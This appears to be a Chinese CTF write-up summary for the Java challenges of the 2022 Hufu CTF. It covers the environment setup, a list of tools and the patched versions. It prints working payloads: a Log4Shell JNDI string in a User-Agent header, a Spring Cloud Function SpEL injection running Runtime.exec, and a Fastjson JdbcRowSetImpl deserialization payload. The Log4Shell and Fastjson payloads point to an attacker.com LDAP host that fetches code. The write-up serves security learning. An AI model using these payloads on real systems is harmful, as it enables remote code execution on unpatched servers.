---
title: 2022 虎符 CTF - Java 部分
contest: 2022 虎符 CTF
year: 2022
difficulty: hard
vuln_type: [lfi, rce, web_unknown, auth_bypass]
tags: [虎符CTF, Java, Spring, Fastjson, JNDI, log4j, Log4Shell, Spring-cloud-function, SpEL, nginx-conf, proxy_pass, docker-compose]
attack_chain: ["环境: docker-compose + nginx + web app + flag 挂载", "Spring Boot 应用, 攻击面: Fastjson 反序列化 + Spring Cloud Function SpEL", "Log4Shell: ${jndi:ldap://attacker/x} 触发 JNDI lookup", "Spring Cloud Function SpEL: spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec('id')", "Fastjson < 1.2.83 反序列化: {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://x\",\"autoCommit\":true}", "RCE 出 flag"]
key_payload: "${jndi:ldap://attacker.com/Exploit}"
one_liner: 2022 虎符 CTF Java：log4j JNDI + Spring Cloud SpEL + Fastjson 反序列化
lesson: 2021 年底 log4j Log4Shell 是 Java 生态最大 0day；Spring + Fastjson 是高频漏洞
quality: high
---

# 2022 虎符 CTF - Java 部分

原文 https://www.ctfiot.com/31821.html

## 环境
```yaml
version: '2.4'
services:
  nginx:
    image: nginx:1.15
    ports:
      - "0.0.0.0:8090:80"
    volumes:
      - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro
    networks:
      - internal_network
      - out_network
  web:
    build: ./
    restart: always
    volumes:
      - ./flag:/flag:ro
    networks:
      - internal_network
```

## nginx.conf
```nginx
server {
    listen 80;
    server_name localhost;
    location / {
        root /usr/share/nginx/html;
        index index.html index.htm;
        proxy_pass http://web:8090;
    }
}
```

## 攻击链

### 1. Log4Shell (CVE-2021-44228)
```http
GET / HTTP/1.1
User-Agent: ${jndi:ldap://attacker.com/Exploit}
```
- log4j 2.x < 2.15.0 远程代码执行
- 攻击者 LDAP 服务返回恶意 class
- Spring Boot 默认有 log4j

### 2. Spring Cloud Function SpEL
```http
POST /functionRouter
Content-Type: application/x-www-form-urlencoded

spring.cloud.function.routing-expression=T(java.lang.Runtime).getRuntime().exec("id")
```
- CVE-2022-22963
- SpEL 注入 RCE

### 3. Fastjson 反序列化
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/Exploit","autoCommit":true}
```
- Fastjson < 1.2.83
- autoCommit 触发 JNDI lookup

## 教学价值
- **Log4Shell** (CVE-2021-44228) 是 2021 Java 生态最大 0day
- **Spring Cloud Function** SpEL 注入 (CVE-2022-22963)
- **Fastjson** 反序列化是经典
- **JNDI** 注入需要外网 LDAP 服务
- **docker-compose** 模拟真实环境

## 工具
- marshalsec (LDAP 服务)
- JNDI-Exploit-Kit
- ysoserial
- pwntools

## 关联
- 虎符 CTF 是阿里安全办的
- Java 三大件: log4j + Spring + Fastjson

## 修复
- log4j ≥ 2.17.0
- Fastjson ≥ 1.2.83
- Spring Cloud ≥ 3.1.7
